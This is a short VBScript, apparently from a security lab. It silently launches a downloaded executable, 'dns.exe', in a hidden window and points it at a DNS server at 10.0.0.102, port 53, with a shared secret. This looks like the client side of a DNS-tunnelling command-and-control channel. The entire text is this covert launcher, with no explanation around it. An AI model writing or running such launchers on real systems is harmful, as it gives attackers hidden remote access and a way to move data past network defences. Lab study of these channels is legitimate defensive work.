Dim WShell 
Set WShell = CreateObject("WScript.Shell") 
WShell.Run "C:\users\SecurityNik\Downloads\dns.exe --dns server=10.0.0.102,port=53 --secret=Testing1",0 
Set WShell = Nothing 
